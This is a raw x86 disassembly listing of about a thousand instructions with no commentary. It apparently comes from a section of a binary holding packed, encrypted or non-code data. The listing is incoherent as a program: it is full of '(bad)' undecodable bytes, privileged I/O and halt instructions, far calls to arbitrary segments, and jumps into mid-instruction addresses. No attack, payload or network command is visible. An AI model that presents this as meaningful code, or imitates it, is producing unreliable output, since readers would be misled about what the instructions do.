  41a460:	sbb    esi,0x7b2850b7
  41a466:	push   eax
  41a467:	xchg   ecx,eax
  41a468:	(bad)  [esp+ebp*8+0x4d91705d]
  41a46f:	mov    ebx,0x18342d24
  41a474:	mov    cl,0xbf
  41a476:	daa    
  41a477:	add    al,0xd6
  41a479:	xor    edi,DWORD PTR [esp+esi*2-0x3a]
  41a47d:	push   0x6f4f3f78
  41a482:	aad    0x88
  41a484:	fstp   DWORD PTR [ecx+0x6d]
  41a487:	xor    ebp,DWORD PTR [esp+esi*4-0x3b5a97e1]
  41a48e:	pusha  
  41a48f:	into   
  41a490:	cmc    
  41a491:	test   al,0x81
  41a493:	xlat   BYTE PTR ds:[ebx]
  41a494:	test   eax,0x678a496f
  41a499:	call   0xcf19b9ac
  41a49e:	fwait
  41a49f:	adc    BYTE PTR [esp+edx*2-0x57c49927],ch
  41a4a6:	mov    esi,0xa57571fc
  41a4ab:	cmp    DWORD PTR [esi],ebp
  41a4ad:	pop    esi
  41a4ae:	pop    edi
  41a4af:	cmp    DWORD PTR [ebx],0xfffffffb
  41a4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b3:	xchg   DWORD PTR ds:0x2549299e,ebp
  41a4b9:	push   edx
  41a4ba:	push   ss
  41a4bb:	mov    al,ds:0x8b9cdcfb
  41a4c0:	inc    ebp
  41a4c1:	mov    bl,0xd0
  41a4c3:	pop    ebp
  41a4c4:	outs   dx,DWORD PTR ds:[esi]
  41a4c5:	popa   
  41a4c6:	mov    ds:0xc4adc44f,eax
  41a4cb:	pop    edx
  41a4cc:	into   
  41a4cd:	ret    0x3ede
  41a4d0:	aam    0xc9
  41a4d2:	test   DWORD PTR [ebp-0x7cc8b024],ebx
  41a4d8:	cmp    DWORD PTR [esi],ebp
  41a4da:	sar    DWORD PTR [ebx-0x66],0x86
  41a4de:	popa   
  41a4df:	shr    edx,0xbf
  41a4e2:	aad    0x78
  41a4e4:	inc    esi
  41a4e5:	(bad)  
  41a4e7:	mov    al,0xd
  41a4e9:	loope  0x41a4e6
  41a4eb:	cmp    DWORD PTR [ecx+ebp*1+0x2e],edi
  41a4ef:	and    cl,0x67
  41a4f2:	mov    bl,0x47
  41a4f4:	ds loop 0x41a4ea
  41a4f7:	inc    esp
  41a4f8:	add    eax,0xa029abee
  41a4fd:	cs gs mov esi,0x3c1f00aa
  41a504:	cdq    
  41a505:	(bad)  
  41a506:	push   eax
  41a507:	and    eax,0xe22c7f9b
  41a50c:	fwait
  41a50d:	dec    ebp
  41a50e:	jle    0x41a542
  41a510:	dec    ebp
  41a511:	mov    BYTE PTR [ecx-0x32],al
  41a514:	xchg   DWORD PTR [edi+0x50d65f44],edi
  41a51a:	fs fs cld 
  41a51d:	ret    0xe9cd
  41a520:	and    eax,0x449396e8
  41a525:	and    DWORD PTR [ecx+0x1dc2c8d1],esi
  41a52b:	and    ch,ah
  41a52d:	iret   
  41a52e:	call   DWORD PTR [esi-0x3cad6b10]
  41a534:	in     eax,0x9f
  41a536:	int    0xb4
  41a538:	cmp    bl,ah
  41a53a:	xchg   bl,bl
  41a53c:	and    BYTE PTR [ebp+esi*4+0x4f932429],0x5d
  41a544:	dec    ebp
  41a545:	xchg   esp,eax
  41a546:	cmp    BYTE PTR ds:0x853b87df,bl
  41a54c:	test   al,0x45
  41a54e:	and    DWORD PTR [ecx+0x74],edi
  41a551:	ret    
  41a552:	stos   BYTE PTR es:[edi],al
  41a553:	ret    
  41a554:	mov    ch,0x73
  41a556:	in     eax,dx
  41a557:	sbb    DWORD PTR ds:0x82bec791,eax
  41a55d:	sub    eax,0x7c79f6ad
  41a562:	push   cs
  41a563:	xor    DWORD PTR [edi+0x6b],edi
  41a566:	arpl   WORD PTR ds:0xaf442ccf,bp
  41a56c:	fild   QWORD PTR [ebp+0x11]
  41a56f:	fsub   st,st(0)
  41a571:	ja     0x41a5e9
  41a573:	add    esp,DWORD PTR [edi+edi*2+0x252bc7ed]
  41a57a:	sub    edi,ebx
  41a57c:	pop    es
  41a57d:	ret    
  41a57e:	sar    DWORD PTR [eax],0xe4
  41a581:	jg     0x41a50b
  41a583:	xor    BYTE PTR [esi+0x10],bh
  41a586:	mov    esi,0xf8b806
  41a58b:	sbb    eax,0x6e223289
  41a590:	inc    ecx
  41a591:	mov    eax,ds:0x39b803ec
  41a596:	dec    ebp
  41a597:	fisttp QWORD PTR [ebp+0x5a1e0e75]
  41a59d:	sbb    eax,0x4f871aeb
  41a5a2:	pop    ebx
  41a5a3:	or     edi,DWORD PTR [ebx]
  41a5a5:	retf   0x8bda
  41a5a8:	retf   0x1393
  41a5ab:	ss push ebx
  41a5ad:	sar    DWORD PTR [esi-0x1ffc384b],cl
  41a5b3:	dec    ebx
  41a5b4:	(bad)  
  41a5b5:	fcomp  QWORD PTR [eax]
  41a5b7:	sbb    cl,bl
  41a5b9:	loopne 0x41a5f7
  41a5bb:	(bad)  
  41a5bc:	mov    edx,0x1848a91a
  41a5c1:	push   eax
  41a5c2:	pop    edi
  41a5c3:	pop    ebx
  41a5c4:	xor    eax,0x2787367e
  41a5c9:	shl    DWORD PTR [ebx+0x273d3696],1
  41a5cf:	addr16 gs in al,0xd9
  41a5d3:	xchg   esi,eax
  41a5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5d5:	mov    edx,0xd8c2eab5
  41a5da:	jmp    0xafad4164
  41a5df:	mov    ds:0xfaa3bb1c,al
  41a5e4:	retf   
  41a5e5:	lods   eax,DWORD PTR ds:[esi]
  41a5e6:	retf   
  41a5e7:	push   ds
  41a5e8:	jno    0x41a663
  41a5ea:	test   al,0xe2
  41a5ec:	outs   dx,BYTE PTR ds:[esi]
  41a5ed:	xchg   edi,esp
  41a5ef:	jecxz  0x41a63a
  41a5f1:	mov    al,0x51
  41a5f3:	sub    DWORD PTR [ebx+edx*4-0x5ed0ea4c],edi
  41a5fa:	push   0xfffffffa
  41a5fc:	imul   esp,DWORD PTR ds:0x2ef00fee,0xffffff8f
  41a603:	ret    
  41a604:	mov    ah,0xe0
  41a606:	dec    ebx
  41a607:	push   esp
  41a608:	ficom  DWORD PTR [edi]
  41a60a:	test   DWORD PTR [eax+0x3ed2f70e],0x45dee09d
  41a614:	fistp  QWORD PTR [esi-0x62b386c7]
  41a61a:	add    cl,dh
  41a61c:	in     eax,dx
  41a61d:	push   esp
  41a61e:	in     al,0x62
  41a620:	dec    ebx
  41a621:	xor    BYTE PTR [esi-0x44],dh
  41a624:	mov    edi,0x905c0c39
  41a629:	mov    ds:0x287b690e,eax
  41a62e:	loop   0x41a5f1
  41a630:	mov    ebx,0xb2c8055d
  41a635:	div    ebx
  41a637:	fadd   DWORD PTR [esi+0x5c]
  41a63a:	(bad)
  41a63e:	add    ecx,ebx
  41a640:	lods   al,BYTE PTR ds:[esi]
  41a641:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41a643:	push   edi
  41a644:	das    
  41a645:	dec    esi
  41a646:	cmp    BYTE PTR [ebp-0x75],bl
  41a649:	ret    0x3ef6
  41a64c:	pop    edi
  41a64d:	adc    dl,BYTE PTR [ebp-0x5297cbbc]
  41a653:	rol    al,cl
  41a655:	call   0x9b48:0xd035273f
  41a65c:	rcr    ecx,1
  41a65e:	jl     0x41a61b
  41a660:	pop    es
  41a661:	adc    BYTE PTR [ecx],0x73
  41a664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a665:	mov    ds:0x5b236472,eax
  41a66a:	hlt    
  41a66b:	and    BYTE PTR [eax],dl
  41a66d:	in     al,0xa3
  41a66f:	fsub   DWORD PTR [edx]
  41a671:	jnp    0x41a684
  41a673:	mov    bh,al
  41a675:	mov    WORD PTR [ecx],?
  41a677:	leave  
  41a678:	sub    bl,BYTE PTR [ecx-0x17a997f2]
  41a67e:	and    al,0x16
  41a680:	dec    esi
  41a681:	xor    edi,DWORD PTR [edi-0x68d9ce92]
  41a687:	or     dl,dh
  41a689:	(bad)  
  41a68a:	jbe    0x41a643
  41a68c:	or     edi,esp
  41a68e:	fwait
  41a68f:	mov    edx,DWORD PTR [eax-0xc302879]
  41a695:	les    edx,FWORD PTR [eax-0x7a]
  41a698:	stos   BYTE PTR es:[edi],al
  41a699:	sbb    DWORD PTR [esi+0x13],0xda42944c
  41a6a0:	sbb    ah,BYTE PTR [edx+0x6a]
  41a6a3:	imul   ebp,DWORD PTR [ecx+0x191a844d],0x276618d4
  41a6ad:	adc    DWORD PTR [esp+eax*2-0x42360c53],ecx
  41a6b4:	cs inc edx
  41a6b6:	mov    dl,0x48
  41a6b8:	pop    edx
  41a6b9:	pop    ds
  41a6ba:	pusha  
  41a6bb:	and    BYTE PTR [eax-0x56acfc44],bl
  41a6c1:	xor    ch,BYTE PTR ds:0xdadf7122
  41a6c7:	and    eax,0xe8fe0e1
  41a6cc:	ins    BYTE PTR es:[edi],dx
  41a6cd:	mov    esp,ebp
  41a6cf:	dec    ebp
  41a6d0:	std    
  41a6d1:	and    BYTE PTR [esi+0x6b],bl
  41a6d4:	inc    edi
  41a6d5:	mov    es,WORD PTR [ebx]
  41a6d7:	inc    eax
  41a6d8:	popa   
  41a6d9:	retf   
  41a6da:	ret    0xab78
  41a6dd:	push   ebx
  41a6de:	divps  xmm3,XMMWORD PTR [esi]
  41a6e1:	nop
  41a6e2:	fsincos 
  41a6e4:	ret    0xb8c7
  41a6e7:	adc    DWORD PTR [ebp-0x1c0ce11b],ebx
  41a6ed:	call   DWORD PTR [esi-0x40]
  41a6f0:	xchg   ebp,eax
  41a6f1:	das    
  41a6f2:	push   ss
  41a6f3:	push   edx
  41a6f4:	add    al,0xa
  41a6f6:	xlat   BYTE PTR ds:[ebx]
  41a6f7:	xor    BYTE PTR [esi],al
  41a6f9:	out    0x4,al
  41a6fb:	inc    esi
  41a6fc:	xchg   edi,eax
  41a6fd:	or     eax,0x5e9b034c
  41a702:	and    DWORD PTR [edi],eax
  41a704:	outs   dx,BYTE PTR ds:[esi]
  41a705:	mov    dl,0xd4
  41a707:	sub    DWORD PTR [ebx-0x63],0xffffff90
  41a70b:	cmp    eax,0x632b44ba
  41a710:	or     ebp,DWORD PTR [ecx-0x670b2cde]
  41a716:	dec    ecx
  41a717:	inc    ecx
  41a718:	xchg   edi,eax
  41a719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a71a:	cwde   
  41a71b:	stos   DWORD PTR es:[edi],eax
  41a71c:	inc    edi
  41a71d:	retf   
  41a71e:	fnstsw WORD PTR [ebp+0x604aaf35]
  41a724:	mov    esp,0x75e3b821
  41a729:	and    eax,0x9a1652e0
  41a72e:	inc    edx
  41a72f:	cmp    BYTE PTR [eax+eiz*1-0x6d],bh
  41a733:	add    BYTE PTR [eax+0x48],dh
  41a736:	das    
  41a737:	sbb    ebp,DWORD PTR ds:0xae17a2df
  41a73d:	xor    esp,ebp
  41a73f:	es add eax,0x4ab4b9c3
  41a745:	ja     0x41a6dd
  41a747:	enter  0xeba3,0x11
  41a74b:	das    
  41a74c:	dec    edx
  41a74d:	inc    esp
  41a74e:	stos   DWORD PTR es:[edi],eax
  41a74f:	(bad)  
  41a750:	push   ss
  41a751:	sti    
  41a752:	ins    DWORD PTR es:[edi],dx
  41a753:	and    eax,0x4f5030fa
  41a758:	adc    ebx,ebx
  41a75a:	out    dx,eax
  41a75b:	gs aam 0x60
  41a75e:	pusha  
  41a75f:	(bad)  
  41a760:	dec    edi
  41a761:	call   0x6381:0x6d3ea029
  41a768:	icebp  
  41a769:	mov    edx,0x1a754d42
  41a76e:	out    dx,eax
  41a76f:	jo     0x41a740
  41a771:	aas    
  41a772:	repz icebp 
  41a774:	js     0x41a7eb
  41a776:	or     eax,0xb15ecc7b
  41a77b:	jne    0x41a743
  41a77d:	enter  0x7e41,0x47
  41a781:	in     eax,0xf9
  41a783:	or     DWORD PTR [ebx-0x70e58],ecx
  41a789:	lock jno 0x41a7da
  41a78c:	outs   dx,BYTE PTR ds:[esi]
  41a78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a78e:	sbb    ebp,DWORD PTR [eax]
  41a790:	sbb    ecx,ebx
  41a792:	lods   al,BYTE PTR ds:[esi]
  41a793:	sbb    ah,BYTE PTR [edx]
  41a795:	push   esp
  41a796:	pop    ecx
  41a797:	fmul   DWORD PTR [ebp-0x1d612577]
  41a79d:	xchg   edi,eax
  41a79e:	bound  edi,QWORD PTR [ebx+0x4d1d5338]
  41a7a4:	jmp    0xd69f:0x4f456fd
  41a7ab:	cs mov esi,0x35364395
  41a7b1:	imul   ebp,DWORD PTR [edx-0x6ea47ded],0xf72be712
  41a7bb:	mov    esi,0x9b9e509e
  41a7c0:	mov    ecx,0x4ccd8b98
  41a7c5:	jbe    0x41a75f
  41a7c7:	adc    esp,DWORD PTR [esi-0x67]
  41a7ca:	pop    es
  41a7cb:	mov    ds:0xe446d8eb,al
  41a7d0:	push   edx
  41a7d1:	repnz cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a7d4:	scas   eax,DWORD PTR es:[edi]
  41a7d5:	xor    eax,esi
  41a7d7:	nop
  41a7d8:	mov    ds:0x9c87b81a,al
  41a7dd:	fdiv   DWORD PTR [esi-0x5c]
  41a7e0:	cwde   
  41a7e1:	mov    ch,0x9
  41a7e3:	push   esi
  41a7e4:	retf   
  41a7e5:	jmp    0x41a7cb
  41a7e7:	leave  
  41a7e8:	loope  0x41a7e8
  41a7ea:	inc    esi
  41a7eb:	dec    ebx
  41a7ec:	sbb    dh,BYTE PTR [eax]
  41a7ee:	repnz add bh,0x64
  41a7f2:	dec    ebp
  41a7f3:	push   edx
  41a7f4:	dec    ecx
  41a7f5:	mov    WORD PTR [ecx],?
  41a7f7:	icebp  
  41a7f8:	and    DWORD PTR [edi+0x6618d4b3],ebx
  41a7fe:	mov    esi,0x3cb50473
  41a803:	paddsw mm4,QWORD PTR [ebp+0x4dc977a8]
  41a80a:	ins    BYTE PTR es:[edi],dx
  41a80b:	retf   
  41a80c:	in     al,dx
  41a80d:	adc    ah,bh
  41a80f:	imul   eax,DWORD PTR [eax],0xe61ecdb2
  41a815:	ror    ah,0x36
  41a818:	loopne 0x41a79b
  41a81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a81b:	xor    cl,BYTE PTR [ebp+esi*1+0x66f30049]
  41a822:	(bad)  
  41a823:	cmp    BYTE PTR [esp+esi*1+0x51307dae],bl
  41a82a:	in     eax,0xd0
  41a82c:	inc    ebp
  41a82d:	push   ebx
  41a82e:	call   0x30a8:0x57277467
  41a835:	out    dx,al
  41a836:	sbb    BYTE PTR [edx+0x687c85bc],al
  41a83c:	fst    QWORD PTR [ebx]
  41a83e:	in     eax,0x0
  41a840:	jmp    0x75ff7e67
  41a845:	int    0xce
  41a847:	fnstsw WORD PTR [edx+0x596ad030]
  41a84d:	out    0x5d,al
  41a84f:	sbb    cl,BYTE PTR [ecx+0x14]
  41a852:	loope  0x41a8cc
  41a854:	les    ebp,FWORD PTR [edx+0x264db059]
  41a85a:	loopne 0x41a850
  41a85c:	arpl   WORD PTR [edi-0x6f70a8af],sp
  41a862:	not    DWORD PTR [ecx-0x4e]
  41a865:	pop    edi
  41a866:	sbb    al,0x0
  41a868:	pop    esp
  41a869:	inc    ebp
  41a86a:	add    bh,BYTE PTR [edx+0x76a43924]
  41a870:	outs   dx,DWORD PTR ds:[esi]
  41a871:	in     eax,0x20
  41a873:	adc    al,0x84
  41a875:	movups XMMWORD PTR [ecx],xmm4
  41a878:	fwait
  41a879:	fs int 0xa8
  41a87c:	sub    eax,0xd4f24a1a
  41a881:	or     al,0xe6
  41a883:	popf   
  41a884:	sbb    eax,0xf46dc6e3
  41a889:	and    dh,dl
  41a88b:	mov    eax,ds:0x2bc24376
  41a890:	fld    TBYTE PTR [eax-0x4f]
  41a893:	das    
  41a894:	mov    cl,0xd
  41a896:	or     DWORD PTR [ecx],ebp
  41a898:	sti    
  41a899:	mov    DWORD PTR [esi],eax
  41a89b:	nop
  41a89c:	fs lods eax,DWORD PTR cs:[esi]
  41a89f:	lods   al,BYTE PTR ds:[esi]
  41a8a0:	and    BYTE PTR ds:0x2679b67,0xcd
  41a8a7:	cmp    eax,0x577187cd
  41a8ac:	or     eax,0x75269fd8
  41a8b1:	cld    
  41a8b2:	cmp    edi,DWORD PTR [ebp-0xe00ce4c]
  41a8b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b9:	lock dec DWORD PTR [ebx+0x60d4fb62]
  41a8c0:	xor    esi,DWORD PTR [ebx-0x3c8df75f]
  41a8c6:	xchg   edx,eax
  41a8c7:	mov    BYTE PTR gs:[ebp+0x1f],ah
  41a8cb:	sti    
  41a8cc:	aaa    
  41a8cd:	retf   
  41a8ce:	mov    ecx,DWORD PTR [eax-0x71]
  41a8d1:	jmp    0x5003:0x6152bdbf
  41a8d8:	and    ecx,eax
  41a8da:	mov    eax,0xa717964c
  41a8df:	jecxz  0x41a87d
  41a8e1:	and    DWORD PTR [ebp-0x49ab839e],ebp
  41a8e7:	jge    0x41a90e
  41a8e9:	dec    esp
  41a8ea:	xchg   edi,eax
  41a8eb:	adc    cl,BYTE PTR [edx-0x796f06c0]
  41a8f1:	ret    
  41a8f2:	adc    DWORD PTR [esi+ebp*4+0x30],esi
  41a8f6:	inc    eax
  41a8f7:	fnsave [ebp-0x5f]
  41a8fa:	cmp    BYTE PTR [eax-0x32b26070],dl
  41a900:	mov    ds:0x5e1ef209,al
  41a905:	adc    DWORD PTR [ecx+0x4e],ebx
  41a908:	ror    BYTE PTR [eax-0x57],0xaa
  41a90c:	and    al,BYTE PTR [esi]
  41a90e:	test   al,0xf0
  41a910:	mov    ch,0xd0
  41a912:	je     0x41a8d3
  41a914:	pop    esp
  41a915:	test   eax,0x775f6125
  41a91a:	ficomp DWORD PTR [ebp-0x1936ec7c]
  41a920:	xchg   ebx,eax
  41a921:	pop    eax
  41a922:	std    
  41a923:	jno    0x41a971
  41a925:	(bad)  [ebx]
  41a927:	mov    edi,0x45157fc6
  41a92c:	out    0xb4,al
  41a92e:	mov    esi,0xdbe21b8
  41a933:	mov    al,0xac
  41a935:	mov    ecx,0x579367fd
  41a93a:	fsubr  QWORD PTR [ebp-0x4a23ba3e]
  41a940:	aad    0x0
  41a942:	sub    eax,0x8e596a65
  41a947:	pop    edi
  41a948:	push   ss
  41a949:	mov    eax,ds:0xbfa318b5
  41a94e:	lahf   
  41a94f:	mov    ds:0x62b550d3,al
  41a954:	js     0x41a959
  41a956:	lock jmp 0x600086a2
  41a95c:	mov    ebp,0x3487a220
  41a961:	pop    eax
  41a962:	cdq    
  41a963:	sar    bh,cl
  41a965:	adc    cl,0x55
  41a968:	xor    esi,DWORD PTR [edx+0x1decc74]
  41a96e:	outs   dx,BYTE PTR ds:[esi]
  41a96f:	fild   DWORD PTR [eax+0x67]
  41a972:	int3   
  41a973:	aas    
  41a974:	(bad)  [esi+0x2e]
  41a977:	fimul  DWORD PTR fs:0x1c260da3
  41a97e:	les    ecx,FWORD PTR [ebx+esi*2-0x7e9ae062]
  41a985:	fadd   QWORD PTR [esp+eiz*2+0xdea90bc]
  41a98c:	xchg   DWORD PTR ds:[ebp-0x64],eax
  41a990:	push   ebx
  41a991:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a993:	mov    edx,0x60131fc4
  41a998:	mov    WORD PTR [ecx+0x65],fs
  41a99b:	inc    esi
  41a99c:	xlat   BYTE PTR ds:[ebx]
  41a99d:	sti    
  41a99e:	in     al,0x71
  41a9a0:	mov    ds:0x82dfe26e,eax
  41a9a5:	std    
  41a9a6:	push   ebp
  41a9a7:	sub    eax,ecx
  41a9a9:	jmp    0xce8f954c
  41a9ae:	jp     0x41aa0f
  41a9b0:	pop    edi
  41a9b1:	lods   al,BYTE PTR ds:[esi]
  41a9b2:	adc    DWORD PTR [ecx-0x71],0x4f
  41a9b6:	lods   eax,DWORD PTR ds:[esi]
  41a9b7:	lock stc 
  41a9b9:	cwde   
  41a9ba:	mov    dh,0x5e
  41a9bc:	or     bl,BYTE PTR [esp+ecx*1+0x3d]
  41a9c0:	jb     0x41a955
  41a9c2:	mov    BYTE PTR [ebp+0x2cf90046],bh
  41a9c8:	cmc    
  41a9c9:	rol    DWORD PTR [ecx],1
  41a9cb:	jmp    0x41aa43
  41a9cd:	push   0xffffff98
  41a9cf:	dec    esi
  41a9d0:	push   cs
  41a9d1:	nop
  41a9d2:	cld    
  41a9d3:	xor    eax,0x873c3310
  41a9d8:	xor    al,0xd4
  41a9da:	mov    al,ds:0xb6e03e50
  41a9df:	js     0x41aa10
  41a9e1:	pushf  
  41a9e2:	aad    0x7b
  41a9e4:	jle    0x41a9f1
  41a9e6:	cmc    
  41a9e7:	ret    
  41a9e8:	pop    es
  41a9e9:	mov    al,0x22
  41a9eb:	cmp    al,0x0
  41a9ed:	out    0x8e,al
  41a9ef:	inc    eax
  41a9f0:	les    eax,FWORD PTR [eax+edi*2+0x6d]
  41a9f4:	inc    eax
  41a9f5:	add    DWORD PTR [eax+0x60],esi
  41a9f8:	aaa    
  41a9f9:	cwde   
  41a9fa:	gs in  eax,dx
  41a9fc:	lea    esp,[esi+0x39591ae8]
  41aa02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa03:	int3   
  41aa04:	cmp    DWORD PTR [esi+0x6],ebx
  41aa07:	and    BYTE PTR [esi-0x47cbc6a9],dl
  41aa0d:	pop    edx
  41aa0e:	imul   ebx,esi,0xffffffe8
  41aa11:	adc    al,0xe8
  41aa13:	bnd js 0x41a9a0
  41aa16:	test   DWORD PTR [esi],ecx
  41aa18:	sahf   
  41aa19:	dec    edi
  41aa1a:	arpl   WORD PTR [edi],bx
  41aa1c:	mov    eax,ds:0x8a23d769
  41aa21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa22:	push   ebp
  41aa23:	pop    edx
  41aa24:	cdq    
  41aa25:	mov    ds:0xfb4e1e4b,al
  41aa2a:	lods   eax,DWORD PTR ds:[esi]
  41aa2b:	cmp    eax,0x44e65efc
  41aa30:	cs mov bh,0xe4
  41aa33:	loopne 0x41aa25
  41aa35:	jg     0x41aaaa
  41aa37:	or     eax,0x2fd1b281
  41aa3c:	fwait
  41aa3d:	dec    ebx
  41aa3e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41aa40:	add    eax,0x7c10a56f
  41aa45:	xchg   BYTE PTR [ebp-0x1477e05f],cl
  41aa4b:	std    
  41aa4c:	cmp    eax,0x350ea515
  41aa51:	fidiv  WORD PTR [edx]
  41aa53:	pop    eax
  41aa54:	sub    ebx,DWORD PTR [eax+0x2e906495]
  41aa5a:	adc    ebx,DWORD PTR [esi+0x49ea002f]
  41aa60:	lock neg edx
  41aa63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa64:	adc    ebx,DWORD PTR [ebx+0x1f7fae15]
  41aa6a:	mov    dh,0xfd
  41aa6c:	pop    ss
  41aa6d:	les    ebx,FWORD PTR [ebx+0xf]
  41aa70:	dec    eax
  41aa71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa72:	mov    bl,0x75
  41aa74:	pop    esi
  41aa75:	mov    ah,0x2a
  41aa77:	cmp    al,0x86
  41aa79:	jecxz  0x41aab9
  41aa7b:	cmp    BYTE PTR ds:0x1505ef5c,0x29
  41aa82:	dec    eax
  41aa83:	xchg   DWORD PTR [edi+0x7bd4eb0d],esp
  41aa89:	sar    BYTE PTR [esi+edx*8],cl
  41aa8c:	or     DWORD PTR [ebx-0xc],ebx
  41aa8f:	inc    ecx
  41aa90:	inc    esi
  41aa91:	mov    ch,0x7a
  41aa93:	xchg   esp,eax
  41aa94:	dec    esp
  41aa95:	mov    cl,0xb2
  41aa97:	or     BYTE PTR [edi+0xf],bh
  41aa9a:	lea    eax,[esi]
  41aa9c:	clc    
  41aa9d:	adc    al,0x7e
  41aa9f:	call   0x69bf:0xe951ba3a
  41aaa6:	pop    edx
  41aaa7:	push   ss
  41aaa8:	cmc    
  41aaa9:	retf   
  41aaaa:	jns    0x41aa4a
  41aaac:	jmp    0x41aab0
  41aaae:	pop    esi
  41aaaf:	das    
  41aab0:	(bad)  
  41aab1:	or     dh,dh
  41aab3:	mov    cl,0x31
  41aab5:	mov    ecx,0x6f2da9d4
  41aaba:	xor    cl,BYTE PTR [eax-0x10]
  41aabd:	dec    ecx
  41aabe:	push   es
  41aabf:	retf   
  41aac0:	push   edi
  41aac1:	sbb    ch,0xb9
  41aac4:	pop    ecx
  41aac5:	dec    esp
  41aac6:	out    0x35,al
  41aac8:	jb     0x41aa7b
  41aaca:	xchg   ebx,eax
  41aacb:	mov    dl,0x53
  41aacd:	iret   
  41aace:	pop    edx
  41aacf:	push   0xa8db0ab7
  41aad4:	and    bl,BYTE PTR [edx-0x370af133]
  41aada:	mov    ch,0xc8
  41aadc:	inc    edi
  41aadd:	int3   
  41aade:	lahf   
  41aadf:	lods   eax,DWORD PTR ds:[esi]
  41aae0:	add    al,0xb
  41aae2:	les    eax,FWORD PTR [esi+0x79892e08]
  41aae8:	fsubr  QWORD PTR [eax+esi*4]
  41aaeb:	push   eax
  41aaec:	popf   
  41aaed:	(bad)  
  41aaee:	jno    0x41aada
  41aaf0:	ins    BYTE PTR es:[edi],dx
  41aaf1:	cmp    edi,DWORD PTR [esi]
  41aaf3:	inc    ecx
  41aaf4:	xchg   ecx,eax
  41aaf5:	push   ecx
  41aaf6:	inc    ecx
  41aaf7:	call   0xb906:0x4040c86c
  41aafe:	xchg   edx,eax
  41aaff:	jno    0x41aaee
  41ab01:	sbb    al,bh
  41ab03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab04:	fcomp  QWORD PTR [edi+0x63]
  41ab07:	mov    dl,0xe2
  41ab09:	dec    ebx
  41ab0a:	cmp    eax,0xb9815693
  41ab0f:	loope  0x41aa9b
  41ab11:	pop    ebp
  41ab12:	mov    edi,0x7610e12e
  41ab17:	pop    ebx
  41ab18:	fwait
  41ab19:	jl     0x41ab31
  41ab1b:	and    bl,BYTE PTR [edx-0x1335a063]
  41ab21:	call   0x43660299
  41ab26:	mov    BYTE PTR [ebp+esi*4-0x4d07a7eb],ah
  41ab2d:	mov    esi,0x37652b2d
  41ab32:	(bad)  
  41ab33:	loopne 0x41aba7
  41ab35:	iret   
  41ab36:	fimul  DWORD PTR [ebp+0x69bba270]
  41ab3c:	mov    WORD PTR [ebx+0xf],fs
  41ab3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab40:	popa   
  41ab41:	sti    
  41ab42:	cmp    ebx,ebp
  41ab44:	outs   dx,BYTE PTR ds:[esi]
  41ab45:	push   cs
  41ab46:	sub    ecx,edx
  41ab48:	sub    bl,al
  41ab4a:	adc    ch,BYTE PTR [esi-0x40]
  41ab4d:	(bad)  
  41ab4e:	mov    ah,0x6f
  41ab50:	push   esi
  41ab51:	int3   
  41ab52:	lods   al,BYTE PTR ds:[esi]
  41ab53:	popa   
  41ab54:	popa   
  41ab55:	nop
  41ab56:	jnp    0x41aaf9
  41ab58:	jmp    0x41abd1
  41ab5a:	enter  0xe870,0xb4
  41ab5e:	dec    esi
  41ab5f:	shl    BYTE PTR [ebp+0x2b8c6252],1
  41ab65:	jnp    0x41aaed
  41ab67:	punpckhdq mm2,mm3
  41ab6a:	push   esp
  41ab6b:	cdq    
  41ab6c:	xor    al,0x97
  41ab6e:	stc    
  41ab6f:	sbb    ebx,DWORD PTR [ebx]
  41ab71:	pminub mm0,QWORD PTR [edi-0x4e35d118]
  41ab78:	(bad)  
  41ab79:	call   0xa259dca2
  41ab7e:	int3   
  41ab7f:	inc    esi
  41ab80:	fs and eax,0x914c9557
  41ab86:	xor    DWORD PTR [edx],edi
  41ab88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab89:	lahf   
  41ab8a:	stc    
  41ab8b:	add    al,ch
  41ab8d:	and    BYTE PTR [edx],al
  41ab8f:	bound  ebx,QWORD PTR [esi]
  41ab91:	bound  edi,QWORD PTR [edx-0x47]
  41ab94:	(bad)  
  41ab95:	(bad)  
  41ab96:	(bad)  
  41ab97:	jmp    0xfe7f:0xea7fa68b
  41ab9e:	out    0xa7,al
  41aba0:	inc    ebx
  41aba1:	mov    ecx,gs
  41aba3:	repz cld 
  41aba5:	icebp  
  41aba6:	jb     0x41ab2c
  41aba8:	ror    BYTE PTR ds:0x26e836c7,0xc3
  41abaf:	xchg   esi,eax
  41abb0:	mov    ebp,0xe3cb5d51
  41abb5:	les    esi,FWORD PTR [ecx-0x2d]
  41abb8:	xchg   esp,eax
  41abb9:	clc    
  41abba:	mov    bh,0x5e
  41abbc:	test   al,0x9a
  41abbe:	xchg   esp,eax
  41abbf:	mov    bh,0x25
  41abc1:	jecxz  0x41abd9
  41abc3:	mov    bl,0xea
  41abc5:	repnz pop ebp
  41abc7:	je     0x41ac22
  41abc9:	jb     0x41abec
  41abcb:	popa   
  41abcc:	add    al,0xf1
  41abce:	scas   al,BYTE PTR es:[edi]
  41abcf:	inc    edx
  41abd0:	xor    ah,BYTE PTR [eax-0x2d]
  41abd3:	cmp    dl,BYTE PTR [eax+0x67]
  41abd6:	lahf   
  41abd7:	std    
  41abd8:	(bad)  
  41abd9:	nop
  41abda:	jle    0x41ac48
  41abdc:	adc    eax,0x79040aa1
  41abe1:	repz pop ss
  41abe3:	aaa    
  41abe4:	pop    edx
  41abe5:	addr16 and ebx,0x4f
  41abe9:	mov    edx,0x80a3ac9f
  41abee:	ja     0x41aba0
  41abf0:	push   0x25
  41abf2:	mov    cl,0x1f
